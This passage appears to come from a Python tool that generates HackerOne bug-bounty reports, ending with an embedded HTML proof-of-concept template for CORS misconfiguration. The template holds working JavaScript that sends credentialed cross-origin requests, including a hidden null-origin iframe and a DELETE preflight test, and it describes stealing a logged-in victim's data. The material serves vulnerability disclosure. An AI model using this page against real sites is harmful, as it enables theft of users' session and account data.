        // Test 1: Arbitrary Origin
        function testArbitrary() {{
            var el = document.getElementById('result-arbitrary');
            el.textContent = 'Sending credentialed request to {domain}...';
            fetch('{url}', {{method:'GET', credentials:'include', mode:'cors'}})
                .then(function(r) {{ return r.text().then(function(b){{ return {{resp:r, body:b}}; }}); }})
                .then(function(data) {{
                    var text = formatResponse(data.resp, data.body);
                    el.innerHTML = highlightSensitive(text.replace(/</g,'&lt;').replace(/>/g,'&gt;'));
                }})
                .catch(function(e) {{ el.textContent = 'CORS blocked: ' + e.message + '\\n\\nThis means the browser correctly blocked the request from this origin.'; }});
        }}

        // Test 2: Null Origin via sandboxed iframe
        function testNullOrigin() {{
            var el = document.getElementById('result-null');
            var host = document.getElementById('iframe-host');
            el.textContent = 'Creating sandboxed iframe (Origin: null)...';

            // Listen for postMessage from the iframe
            window.addEventListener('message', function handler(event) {{
                if (event.data && event.data.type === 'cors-null-result') {{
                    el.innerHTML = highlightSensitive(
                        (event.data.result || '').replace(/</g,'&lt;').replace(/>/g,'&gt;')
                    );
                    window.removeEventListener('message', handler);
                }}
            }});

            // The iframe has Origin: null due to sandbox + srcdoc
            var iframeCode = '<scr'+'ipt>'
                + 'fetch("' + '{url}' + '",{{method:"GET",credentials:"include",mode:"cors"}})'
                + '.then(function(r){{return r.text().then(function(b){{return{{resp:r,body:b}};}})}})'
                + '.then(function(d){{'
                + '  var out="Origin: null\\nStatus: "+d.resp.status+"\\n";'
                + '  out+="ACAO: "+(d.resp.headers.get("access-control-allow-origin")||"not set")+"\\n";'
                + '  out+="ACAC: "+(d.resp.headers.get("access-control-allow-credentials")||"not set")+"\\n";'
                + '  out+="\\n--- Body ---\\n"+d.body;'
                + '  parent.postMessage({{type:"cors-null-result",result:out}},"*");'
                + '}})'
                + '.catch(function(e){{parent.postMessage({{type:"cors-null-result",result:"Blocked: "+e.message}},"*")}})'
                + '</scr'+'ipt>';

            host.innerHTML = '';
            var iframe = document.createElement('iframe');
            iframe.sandbox = 'allow-scripts';
            iframe.srcdoc = iframeCode;
            iframe.style.width = '0';
            iframe.style.height = '0';
            iframe.style.border = 'none';
            host.appendChild(iframe);
        }}

        // Test 3: Preflight (OPTIONS)
        function testPreflight() {{
            var el = document.getElementById('result-preflight');
            el.textContent = 'Sending preflight-triggering request to {domain}...';

            // Use a non-simple request to force browser preflight
            fetch('{url}', {{
                method: 'DELETE',
                credentials: 'include',
                mode: 'cors',
                headers: {{'X-Custom-Header': 'test'}}
            }})
            .then(function(r) {{ return r.text().then(function(b){{ return {{resp:r, body:b}}; }}); }})
            .then(function(data) {{
                var text = 'Preflight passed — DELETE allowed\\n';
                text += formatResponse(data.resp, data.body);
                el.innerHTML = highlightSensitive(text.replace(/</g,'&lt;').replace(/>/g,'&gt;'));
            }})
            .catch(function(e) {{
                el.textContent = 'Preflight blocked: ' + e.message + '\\n\\nThe server rejected the preflight or browser blocked the non-simple request.';
            }});
        }}
    </script>

    <!-- ============ MANUAL VERIFICATION ============ -->
    <h2>Manual Verification (curl)</h2>
    <div class="test">
        {curl_cmds}
    </div>

    <!-- ============ IMPACT ============ -->
    <div class="test">
        <h2>What This Proves</h2>
        <p><strong>{domain}</strong> allows arbitrary origins to read authenticated API responses via CORS misconfiguration.</p>
        <p><strong>Attack scenario:</strong></p>
        <ol>
            <li>Attacker hosts this HTML page on their domain</li>
            <li>Victim visits the page while authenticated on <strong>{domain}</strong></li>
            <li>JavaScript reads the API response including session/account data</li>
            <li>Attacker exfiltrates the data to their server</li>
        </ol>
        <p>The evidence above shows this <em>actually happened</em> — the response was read cross-origin with credentials.</p>
    </div>
</body>
</html>'''


# =============================================================================
# CONVENIENCE FUNCTIONS
# =============================================================================


def generate_hackerone_report(
    finding: Dict[str, Any],
    evidence: Optional[Dict[str, Any]] = None,
    output_dir: Optional[str] = None,
) -> Tuple[HackerOneReport, Dict[str, str]]:
    """
    Quick function to generate a HackerOne report from a finding.

    Args:
        finding: Vulnerability finding dictionary
        evidence: Optional additional evidence
        output_dir: Optional output directory

    Returns:
        Tuple of (HackerOneReport, saved_files_dict)
    """
    generator = HackerOneReportGenerator(
        output_dir=Path(output_dir) if output_dir else None
    )

    report = generator.generate_report(finding, evidence)
    saved_files = generator.save_report(report, formats=["md", "json", "html"])

    return report, saved_files


def findings_to_hackerone_reports(
    findings: List[Dict[str, Any]],
    output_dir: Optional[str] = None,
) -> List[Tuple[HackerOneReport, Dict[str, str]]]:
    """
    Generate HackerOne reports for multiple findings.

    Args:
        findings: List of vulnerability findings
        output_dir: Optional output directory

    Returns:
        List of (HackerOneReport, saved_files_dict) tuples
    """
    generator = HackerOneReportGenerator(
        output_dir=Path(output_dir) if output_dir else None
    )

    results = []
    for finding in findings:
        report = generator.generate_report(finding)
        saved_files = generator.save_report(report)
        results.append((report, saved_files))

    return results


# =============================================================================
# EXPORTS
# =============================================================================


__all__ = [
    "HackerOneReportGenerator",
    "HackerOneReport",
    "AssetInfo",
    "ReproductionStep",
    "VulnCategory",
    "VULN_CWE_MAPPING",
    "PROGRAM_SCOPES",
    "match_asset_to_scope",
    "generate_hackerone_report",
    "findings_to_hackerone_reports",
]
